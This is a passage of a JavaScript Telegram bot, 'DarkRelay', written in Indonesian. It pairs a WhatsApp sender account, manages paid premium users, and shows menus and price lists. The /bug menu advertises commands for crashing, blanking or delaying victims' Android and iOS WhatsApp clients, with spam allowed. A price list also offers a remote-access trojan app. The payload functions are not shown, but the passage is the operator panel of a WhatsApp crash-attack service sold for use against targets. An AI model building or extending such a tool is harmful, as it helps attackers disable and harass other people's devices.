        return;
    }
    next();
};

const checkCooldown = (ctx, next) => {
    const userId = ctx.from.id
    const now = Date.now()

    if (userCooldowns.has(userId)) {
        const lastUsed = userCooldowns.get(userId)
        const diff = (now - lastUsed) / 1000

        if (diff < cooldown) {
            const remaining = Math.ceil(cooldown - diff)
            ctx.reply(`⏳ ☇ Harap menunggu ${remaining} detik`)
            return
        }
    }

    userCooldowns.set(userId, now)
    next()
}

const checkPremium = (ctx, next) => {
    if (!isPremiumUser(ctx.from.id)) {
        ctx.reply("❌ ☇ Akses hanya untuk premium");
        return;
    }
    next();
};

bot.command("requestpair", async (ctx) => {
   if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 ☇ Format: /requestpair 62×××");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ ☇ Nomor tidak valid");

  try {
    if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(`✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
    }

    const code = await sock.requestPairingCode(phoneNumber);  
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;  

    const pairingMenu = `<blockquote>
#- ＲＯＸＳＴＥＲ ＳＣＲＩＰＴ

▢ Number: ${phoneNumber}
▢ Pairing Code: ${formattedCode}
▢ Type: Not Connected
</blockquote>`;

    const sentMsg = await ctx.replyWithPhoto(thumbnailUrl, {  
      caption: pairingMenu,  
      parse_mode: "HTML"  
    });  

    lastPairingMessage = {  
      chatId: ctx.chat.id,  
      messageId: sentMsg.message_id,  
      phoneNumber,  
      pairingCode: formattedCode
    };

  } catch (err) {
    console.error(err);
  }
});

if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `<blockquote>
#- ＲＯＸＳＴＥＲ ＳＣＲＩＰＴ

▢ Number: ${lastPairingMessage.phoneNumber}
▢ Pairing Code: ${lastPairingMessage.pairingCode}
▢ Type: Connected
</blockquote>`;

      try {  
        await bot.telegram.editMessageCaption(  
          lastPairingMessage.chatId,  
          lastPairingMessage.messageId,  
          undefined,  
          updateConnectionMenu,  
          { parse_mode: "HTML" }  
        );  
      } catch (e) {  
      }  
    }
  });
}

bot.command("setcooldown", async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    const seconds = parseInt(args[1]);

    if (isNaN(seconds) || seconds < 0) {
        return ctx.reply("🪧 ☇ Format: /setcooldown 5");
    }

    cooldown = seconds
    saveCooldown(seconds)
    ctx.reply(`✅ ☇ Cooldown berhasil diatur ke ${seconds} detik`);
});

bot.command("resetsession", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;

    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }

    if (deleted) {
      await ctx.reply("✅ ☇ Session berhasil dihapus, panel akan restart");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 ☇ Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ ☇ Gagal menghapus session");
  }
});

bot.command('addpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addpremium 12345678 30d");
    }
    const userId = args[1];
    const duration = parseInt(args[2]);
    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }
    const expiryDate = addPremiumUser(userId, duration);
    ctx.reply(`✅ ☇ ${userId} berhasil ditambahkan sebagai pengguna premium sampai ${expiryDate}`);
});

bot.command('delpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delpremium 12345678");
    }
    const userId = args[1];
    removePremiumUser(userId);
        ctx.reply(`✅ ☇ ${userId} telah berhasil dihapus dari daftar pengguna premium`);
});

bot.command('addgcpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addgcpremium -12345678 30d");
    }

    const groupId = args[1];
    const duration = parseInt(args[2]);

    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }

    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');

    premiumUsers[groupId] = expiryDate;
    savePremiumUsers(premiumUsers);

    ctx.reply(`✅ ☇ ${groupId} berhasil ditambahkan sebagai grub premium sampai ${expiryDate}`);
});

bot.command('delgcpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delgcpremium -12345678");
    }

    const groupId = args[1];
    const premiumUsers = loadPremiumUsers();

    if (premiumUsers[groupId]) {
        delete premiumUsers[groupId];
        savePremiumUsers(premiumUsers);
        ctx.reply(`✅ ☇ ${groupId} telah berhasil dihapus dari daftar pengguna premium`);
    } else {
        ctx.reply(`🪧 ☇ ${groupId} tidak ada dalam daftar premium`);
    }
});

bot.use((ctx, next) => {
  if (secureMode) {
    return;
  }
  return next();
});

bot.start(ctx => {
    const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
    const senderStatus = isWhatsAppConnected ? "Yes" : "No";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();
  
    const menuMessage = `<blockquote><tg-emoji emoji-id="5893257006323603821">👻</tg-emoji> 𝘿𝘼𝙍𝙆𝙍𝙀𝙇𝘼𝙔- 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎 <tg-emoji emoji-id="5881702736843511327">⚠️</tg-emoji>
<tg-emoji emoji-id="5197429921634346862">☠️</tg-emoji> هذا البرنامج النصي خطير للغاية على المستخدمين والأهداف، لذا استخدمه بحكمة. <tg-emoji emoji-id="5348349394469022727">🚬</tg-emoji>

<tg-emoji emoji-id="5197531888452925507">🎁</tg-emoji> 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙎𝙄 - 𝙎𝘾𝙍𝙄𝙋𝙏  <tg-emoji emoji-id="5474197700087932281">🎁</tg-emoji>
<tg-emoji emoji-id="4990434466724840555">🪙</tg-emoji> 𝚂𝙲𝚁𝙸𝙿𝚃 𝙽𝙰𝙼𝙴 : 𝘿𝘼𝙍𝙆𝙍𝙀𝙇𝘼𝙔
<tg-emoji emoji-id="4990434466724840555">🪙</tg-emoji> 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 2.0 BETA
<tg-emoji emoji-id="4990434466724840555">🪙</tg-emoji> 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 : @Fuckyatim
<tg-emoji emoji-id="4990434466724840555">🪙</tg-emoji> 𝙰𝙺𝚂𝙴𝚂 𝙼𝙾𝙳𝙴 : 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎

<tg-emoji emoji-id="5411419730785369685">🎁</tg-emoji> شكرًا لاستخدامك هذا البرنامج النصي. استخدمه استخدامًا حسنًا، ولا تسيء استخدامه لأن ذلك قد يؤدي إلى عقوبات وفقًا للقانون.</blockquote>`;


    const keyboard = [
        [
            {
                text: "𝗔𝗞𝗦𝗘𝗦 ⌂ 𝗠𝗘𝗡𝗨",
                callback_data: "/controls", style: "primary", icon_custom_emoji_id: "5260293700088511294"
            },
            {
                text: "𝗕𝗨𝗚 ⌂ 𝗠𝗢𝗗𝗘",
                callback_data: "/bug", style: "primary", icon_custom_emoji_id: "5893257006323603821"
            }
        ],
        [
            {
                text: "𝗟𝗜𝗦𝗧 𝗛𝗔𝗥𝗚𝗔",
                callback_data: "/harga", style: "danger", icon_custom_emoji_id: "5409048419211682843"
            },
            {
                text: "𝗦𝗨𝗣𝗣𝗢𝗥𝗧",
                callback_data: "/tqto", style: "success", icon_custom_emoji_id: "5807868868886009920"
            },
            {
                text: "𝗛𝗔𝗥𝗚𝗔 𝗨𝗣",
                callback_data: "/upharga", style: "danger", icon_custom_emoji_id: "5409048419211682843"
            }
        ],
        [
            {
                text: "𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥",
                url: "https://t.me/Fuckyatim", style: "primary", icon_custom_emoji_id: "5807868868886009920"
            },
            {
                text: "𝗖𝗛𝗔𝗡𝗡𝗘𝗟",
                url: "https://t.me/Fuckyaetim", style: "primary", icon_custom_emoji_id: "5807868868886009920"
            }
        ]
    ];

    ctx.replyWithPhoto(thumbnailUrl, {
        caption: menuMessage,
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: keyboard
        }
    });
});

bot.action('/start', async (ctx) => {
    const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
    const senderStatus = isWhatsAppConnected ? "Yes" : "No";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();
  
    const menuMessage = `<blockquote><tg-emoji emoji-id="5893257006323603821">👻</tg-emoji> 𝘿𝘼𝙍𝙆𝙍𝙀𝙇𝘼𝙔- 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎 <tg-emoji emoji-id="5881702736843511327">⚠️</tg-emoji>
<tg-emoji emoji-id="5197429921634346862">☠️</tg-emoji> هذا البرنامج النصي خطير للغاية على المستخدمين والأهداف، لذا استخدمه بحكمة. <tg-emoji emoji-id="5348349394469022727">🚬</tg-emoji>

<tg-emoji emoji-id="5197531888452925507">🎁</tg-emoji> 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙎𝙄 - 𝙎𝘾𝙍𝙄𝙋𝙏  <tg-emoji emoji-id="5474197700087932281">🎁</tg-emoji>
<tg-emoji emoji-id="4990434466724840555">🪙</tg-emoji> 𝚂𝙲𝚁𝙸𝙿𝚃 𝙽𝙰𝙼𝙴 : 𝘿𝘼𝙍𝙆𝙍𝙀𝙇𝘼𝙔
<tg-emoji emoji-id="4990434466724840555">🪙</tg-emoji> 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 2.0 BETA
<tg-emoji emoji-id="4990434466724840555">🪙</tg-emoji> 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 : @Fuckyatim
<tg-emoji emoji-id="4990434466724840555">🪙</tg-emoji> 𝙰𝙺𝚂𝙴𝚂 𝙼𝙾𝙳𝙴 : 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎

<tg-emoji emoji-id="5411419730785369685">🎁</tg-emoji> شكرًا لاستخدامك هذا البرنامج النصي. استخدمه استخدامًا حسنًا، ولا تسيء استخدامه لأن ذلك قد يؤدي إلى عقوبات وفقًا للقانون.</blockquote>`;

    const keyboard = [
        [
            {
                text: "𝗔𝗞𝗦𝗘𝗦 ⌂ 𝗠𝗘𝗡𝗨",
                callback_data: "/controls", style: "primary", icon_custom_emoji_id: "5260293700088511294"
            },
            {
                text: "𝗕𝗨𝗚 ⌂ 𝗠𝗢𝗗𝗘",
                callback_data: "/bug", style: "primary", icon_custom_emoji_id: "5893257006323603821"
            }
        ],
        [
            {
                text: "𝗟𝗜𝗦𝗧 𝗛𝗔𝗥𝗚𝗔",
                callback_data: "/harga", style: "danger", icon_custom_emoji_id: "5409048419211682843"
            },
            {
                text: "𝗦𝗨𝗣𝗣𝗢𝗥𝗧",
                callback_data: "/tqto", style: "success", icon_custom_emoji_id: "5807868868886009920"
            },
            {
                text: "𝗛𝗔𝗥𝗚𝗔 𝗨𝗣",
                callback_data: "/upharga", style: "danger", icon_custom_emoji_id: "5409048419211682843"
            }
        ],
        [
            {
                text: "𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥",
                url: "https://t.me/Fuckyatim", style: "primary", icon_custom_emoji_id: "5807868868886009920"
            },
            {
                text: "𝗖𝗛𝗔𝗡𝗡𝗘𝗟",
                url: "https://t.me/Fuckyaetim", style: "primary", icon_custom_emoji_id: "5807868868886009920"
            }
        ]
    ];
    
    try {
        await ctx.editMessageMedia({
            type: 'photo',
            media: thumbnailUrl,
            caption: menuMessage,
            parse_mode: "HTML",
        }, {
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/controls', async (ctx) => {
    const controlsMenu = `<blockquote><tg-emoji emoji-id="5893257006323603821">👻</tg-emoji> 𝘿𝘼𝙍𝙆𝙍𝙀𝙇𝘼𝙔- 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎 <tg-emoji emoji-id="5881702736843511327">⚠️</tg-emoji>
<tg-emoji emoji-id="5197429921634346862">☠️</tg-emoji> هذا البرنامج النصي خطير للغاية على المستخدمين والأهداف، لذا استخدمه بحكمة. <tg-emoji emoji-id="5348349394469022727">🚬</tg-emoji>

<tg-emoji emoji-id="5197531888452925507">🎁</tg-emoji> 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙎𝙄 - 𝙎𝘾𝙍𝙄𝙋𝙏  <tg-emoji emoji-id="5474197700087932281">🎁</tg-emoji>
<tg-emoji emoji-id="4990434466724840555">🪙</tg-emoji> 𝚂𝙲𝚁𝙸𝙿𝚃 𝙽𝙰𝙼𝙴 : 𝘿𝘼𝙍𝙆𝙍𝙀𝙇𝘼𝙔
<tg-emoji emoji-id="4990434466724840555">🪙</tg-emoji> 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 2.0 BETA
<tg-emoji emoji-id="4990434466724840555">🪙</tg-emoji> 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 : @Fuckyatim
<tg-emoji emoji-id="4990434466724840555">🪙</tg-emoji> 𝙰𝙺𝚂𝙴𝚂 𝙼𝙾𝙳𝙴 : 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎

<tg-emoji emoji-id="5411419730785369685">🎁</tg-emoji> شكرًا لاستخدامك هذا البرنامج النصي. استخدمه استخدامًا حسنًا، ولا تسيء استخدامه لأن ذلك قد يؤدي إلى عقوبات وفقًا للقانون.</blockquote>
<blockquote>──────────────────────────
#- ⌜ 𝗔𝗞𝗦𝗘𝗦 𝗠𝗘𝗡𝗨 ⌟
┊✦ /requestpair - Add Sender Number
┊✦ /setcooldown - Set Bot Cooldown
┊✦ /resetsession - Reset Existing Session
┊✦ /addpremium - Add Premium Users
┊✦ /delpremium - Delete Premium Users
┊✦ /addgcpremium - Add Premium Group
┊✦ /delgcpremium - Delete Premium Group
──────────────────────────</blockquote>`;

    const keyboard = [
        [
            {
                text: "𝗕𝗔𝗖𝗞 𝗠𝗘𝗡𝗨",
                callback_data: "/start", style: "primary", icon_custom_emoji_id: "5832251986635920010"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(controlsMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

//CASE BUG ANDROID 
bot.action('/bug', async (ctx) => {
    const bugMenu = `<blockquote>╭╴⟬<tg-emoji emoji-id="5424972470023104089">💫</tg-emoji> MURBUG • VVVIP ACCESS <tg-emoji emoji-id="5424972470023104089">💫</tg-emoji> ⟭╶╮

<tg-emoji emoji-id="5798670723975221399">👑</tg-emoji> Android • Delay X Buldoz <tg-emoji emoji-id="6028551194861899805">🛡</tg-emoji> can spam
┊✦ /drxdelay - DarkRelay To Delay
┊✦ /drxblank - DarkRelay To Blank

<tg-emoji emoji-id="5891216553260617496">💎</tg-emoji> iOS • Forclose Invisible   ⟡ <tg-emoji emoji-id="6028551194861899805">🛡</tg-emoji> can spam
┊✦ /fcios - Roxter To Forclose
┊✦ /ios - Roxter To Delay
────────────────────────────</blockquote>`;

    const keyboard = [
        [
            {
                text: "𝗕𝗔𝗖𝗞 𝗠𝗘𝗡𝗨",
                callback_data: "/start", style: "primary", icon_custom_emoji_id: "5832251986635920010"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(bugMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/harga', async (ctx) => {
    const controlsMenu = `<blockquote><tg-emoji emoji-id="5893257006323603821">👻</tg-emoji> 𝘿𝘼𝙍𝙆𝙍𝙀𝙇𝘼𝙔- 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎 <tg-emoji emoji-id="5881702736843511327">⚠️</tg-emoji>
<tg-emoji emoji-id="5197429921634346862">☠️</tg-emoji> هذا البرنامج النصي خطير للغاية على المستخدمين والأهداف، لذا استخدمه بحكمة. <tg-emoji emoji-id="5348349394469022727">🚬</tg-emoji>

<tg-emoji emoji-id="5197531888452925507">🎁</tg-emoji> 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙎𝙄 - 𝙎𝘾𝙍𝙄𝙋𝙏  <tg-emoji emoji-id="5474197700087932281">🎁</tg-emoji>
<tg-emoji emoji-id="4990434466724840555">🪙</tg-emoji> 𝚂𝙲𝚁𝙸𝙿𝚃 𝙽𝙰𝙼𝙴 : 𝘿𝘼𝙍𝙆𝙍𝙀𝙇𝘼𝙔
<tg-emoji emoji-id="4990434466724840555">🪙</tg-emoji> 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 2.0 BETA
<tg-emoji emoji-id="4990434466724840555">🪙</tg-emoji> 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 : @Fuckyatim
<tg-emoji emoji-id="4990434466724840555">🪙</tg-emoji> 𝙰𝙺𝚂𝙴𝚂 𝙼𝙾𝙳𝙴 : 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎

<tg-emoji emoji-id="5411419730785369685">🎁</tg-emoji> شكرًا لاستخدامك هذا البرنامج النصي. استخدمه استخدامًا حسنًا، ولا تسيء استخدامه لأن ذلك قد يؤدي إلى عقوبات وفقًا للقانون.</blockquote>
<blockquote>✦••┈┈ - ʜᴀʀɢᴀ ꜱᴄ ᴅᴀʀᴋʀᴇʟᴀʏ - ┈┈••✦
<tg-emoji emoji-id="5267400711322226107">🔪</tg-emoji> FULL UP = 5.000
<tg-emoji emoji-id="5267400711322226107">🔪</tg-emoji> RESELLER = 20.000
<tg-emoji emoji-id="5267400711322226107">🔪</tg-emoji> OWNER = 40.000
<tg-emoji emoji-id="5267400711322226107">🔪</tg-emoji> ADMIN = 60.000
<tg-emoji emoji-id="5267400711322226107">🔪</tg-emoji> HIGH ADMIN = 80.000
<tg-emoji emoji-id="5267400711322226107">🔪</tg-emoji> MODERATOR = 100.000
﻿
<blockquote><strong>Benefit Script 🎰:</strong></blockquote>
<tg-emoji emoji-id="5370919202796348364">🤔</tg-emoji> Menu Bug Select <tg-emoji emoji-id="6267008582294705964">✅</tg-emoji>
<tg-emoji emoji-id="5370919202796348364">🤔</tg-emoji> Menu Bug V1 <tg-emoji emoji-id="6267008582294705964">✅</tg-emoji>
<tg-emoji emoji-id="5370919202796348364">🤔</tg-emoji> Menu Bug V2 <tg-emoji emoji-id="6267008582294705964">✅</tg-emoji>
<tg-emoji emoji-id="5370919202796348364">🤔</tg-emoji> Menu Bug V3 <tg-emoji emoji-id="6267008582294705964">✅</tg-emoji>
<tg-emoji emoji-id="5370919202796348364">🤔</tg-emoji> Script Simple <tg-emoji emoji-id="6267008582294705964">✅</tg-emoji>
<tg-emoji emoji-id="5370919202796348364">🤔</tg-emoji> Bug Gb <tg-emoji emoji-id="6267008582294705964">✅</tg-emoji>
<tg-emoji emoji-id="5370919202796348364">🤔</tg-emoji> Bug Ch <tg-emoji emoji-id="6267008582294705964">✅</tg-emoji>
<tg-emoji emoji-id="5370919202796348364">🤔</tg-emoji> Bug Comu <tg-emoji emoji-id="6267008582294705964">✅</tg-emoji>
<tg-emoji emoji-id="5370919202796348364">🤔</tg-emoji> Md Menu <tg-emoji emoji-id="6267008582294705964">✅</tg-emoji>
<tg-emoji emoji-id="5370919202796348364">🤔</tg-emoji> Nsfw Menu <tg-emoji emoji-id="6267008582294705964">✅</tg-emoji>
<tg-emoji emoji-id="5370919202796348364">🤔</tg-emoji> Secret Bug Menu <tg-emoji emoji-id="6267008582294705964">✅</tg-emoji>
<tg-emoji emoji-id="5370919202796348364">🤔</tg-emoji> MultiBug Number <tg-emoji emoji-id="6267008582294705964">✅</tg-emoji>
<tg-emoji emoji-id="5370919202796348364">🤔</tg-emoji> Fun Menu <tg-emoji emoji-id="6267008582294705964">✅</tg-emoji>
<tg-emoji emoji-id="5370919202796348364">🤔</tg-emoji> Tools Menu <tg-emoji emoji-id="6267008582294705964">✅</tg-emoji>
<tg-emoji emoji-id="5370919202796348364">🤔</tg-emoji> All Function New <tg-emoji emoji-id="6267008582294705964">✅</tg-emoji>
<tg-emoji emoji-id="5370919202796348364">🤔</tg-emoji> Apk DarkRelay X Rat Control <tg-emoji emoji-id="6267008582294705964">✅</tg-emoji>
﻿</blockquote>`;

    const keyboard = [
        [
            {
                text: "𝗕𝗔𝗖𝗞 𝗠𝗘𝗡𝗨",
                callback_data: "/start", style: "primary", icon_custom_emoji_id: "5832251986635920010"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(controlsMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/upharga', async (ctx) => {
    const controlsMenu = `<blockquote><tg-emoji emoji-id="5893257006323603821">👻</tg-emoji> 𝘿𝘼𝙍𝙆𝙍𝙀𝙇𝘼𝙔- 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎 <tg-emoji emoji-id="5881702736843511327">⚠️</tg-emoji>
<tg-emoji emoji-id="5197429921634346862">☠️</tg-emoji> هذا البرنامج النصي خطير للغاية على المستخدمين والأهداف، لذا استخدمه بحكمة. <tg-emoji emoji-id="5348349394469022727">🚬</tg-emoji>

<tg-emoji emoji-id="5197531888452925507">🎁</tg-emoji> 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙎𝙄 - 𝙎𝘾𝙍𝙄𝙋𝙏  <tg-emoji emoji-id="5474197700087932281">🎁</tg-emoji>
<tg-emoji emoji-id="4990434466724840555">🪙</tg-emoji> 𝚂𝙲𝚁𝙸𝙿𝚃 𝙽𝙰𝙼𝙴 : 𝘿𝘼𝙍𝙆𝙍𝙀𝙇𝘼𝙔
<tg-emoji emoji-id="4990434466724840555">🪙</tg-emoji> 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 2.0 BETA
<tg-emoji emoji-id="4990434466724840555">🪙</tg-emoji> 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 : @Fuckyatim
<tg-emoji emoji-id="4990434466724840555">🪙</tg-emoji> 𝙰𝙺𝚂𝙴𝚂 𝙼𝙾𝙳𝙴 : 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎

<tg-emoji emoji-id="5411419730785369685">🎁</tg-emoji> شكرًا لاستخدامك هذا البرنامج النصي. استخدمه استخدامًا حسنًا، ولا تسيء استخدامه لأن ذلك قد يؤدي إلى عقوبات وفقًا للقانون.</blockquote>
<blockquote>──────────────────────────
#- ⌜ 𝗟𝗜𝗦𝗧 𝗛𝗔𝗥𝗚𝗔 ⌟
╔─═⊱ PRICE LIST MEMBER/VIP
┊✦ MEMBER »» VIP = 15.000
┊✦ MEMBER »» RESELLER = 20.000
┊✦ MEMBER »» OWNER = 30.000
┊✦ MEMBER »» ADMIN = 35.000
┊✦ MEMBER »» HIGH ADMIN = 40.000
┊✦ MODERATOR »» = 45.000

╔─═⊱ PRICE LIST RESELLER
┊✦ RESELLER »» OWNER = 10.000
┊✦ RESELLER »» ADMIN = 15.000
┊✦ RESELLER »» HIGH ADMIN = 20.000
┊✦ RESELLER »» MODERATOR = 30.000

╔─═⊱ PRICE LIST OWNER
┊✦ OWNER »» ADMIN = 8.000
┊✦ OWNER »» HIGH ADMIN = 10.000
┊✦ OWNER »» MODERATOR = 15.000

╔─═⊱ PRICE LIST ADMIN
┊✦ ADMIN »» HIGH ADMIN = 10.000
┊✦ ADMIN »» MODERATOR = 15.000</blockquote>`;

    const keyboard = [
        [
            {
                text: "𝗕𝗔𝗖𝗞 𝗠𝗘𝗡𝗨",
                callback_data: "/start", style: "primary", icon_custom_emoji_id: "5832251986635920010"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(controlsMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/tqto', async (ctx) => {
    const tqtoMenu = `<blockquote><tg-emoji emoji-id="5893257006323603821">👻</tg-emoji> 𝘿𝘼𝙍𝙆𝙍𝙀𝙇𝘼𝙔- 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎 <tg-emoji emoji-id="5881702736843511327">⚠️</tg-emoji>
<tg-emoji emoji-id="5197429921634346862">☠️</tg-emoji> هذا البرنامج النصي خطير للغاية على المستخدمين والأهداف، لذا استخدمه بحكمة. <tg-emoji emoji-id="5348349394469022727">🚬</tg-emoji>

<tg-emoji emoji-id="5197531888452925507">🎁</tg-emoji> 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙎𝙄 - 𝙎𝘾𝙍𝙄𝙋𝙏  <tg-emoji emoji-id="5474197700087932281">🎁</tg-emoji>
<tg-emoji emoji-id="4990434466724840555">🪙</tg-emoji> 𝚂𝙲𝚁𝙸𝙿𝚃 𝙽𝙰𝙼𝙴 : 𝘿𝘼𝙍𝙆𝙍𝙀𝙇𝘼𝙔
<tg-emoji emoji-id="4990434466724840555">🪙</tg-emoji> 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 2.0 BETA
<tg-emoji emoji-id="4990434466724840555">🪙</tg-emoji> 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 : @Fuckyatim
<tg-emoji emoji-id="4990434466724840555">🪙</tg-emoji> 𝙰𝙺𝚂𝙴𝚂 𝙼𝙾𝙳𝙴 : 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎

<tg-emoji emoji-id="5411419730785369685">🎁</tg-emoji> شكرًا لاستخدامك هذا البرنامج النصي. استخدمه استخدامًا حسنًا، ولا تسيء استخدامه لأن ذلك قد يؤدي إلى عقوبات وفقًا للقانون.</blockquote>
<blockquote>──────────────────────────
#- ⌜ 𝗦𝗨𝗣𝗣𝗢𝗥𝗧 ⌟
┊ ⓘKedua orang tua gua
┊ ⓘMy Friends
┊ ⓘMy Partner
┊ ⓘAll Pelanggan
┊ ⓘAll Haters
──────────────────────────</blockquote>`;

    const keyboard = [
        [
            {
                text: "𝗕𝗔𝗖𝗞 𝗠𝗘𝗡𝗨",
                callback_data: "/start", style: "primary", icon_custom_emoji_id: "5832251986635920010"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(tqtoMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

////=========MENU UTAMA========\\\\
// Auto Update Repo + Report File

const Owner = "animationarmufa-oss";
const Repo = "DarkRelay-update-premium";
const Branch = "main";

const GITHUB_API = `https://api.github.com/repos/${Owner}/${Repo}/commits/${Branch}`;
let lastCommitSha = null;

async function getRepoFiles(dir = "") {
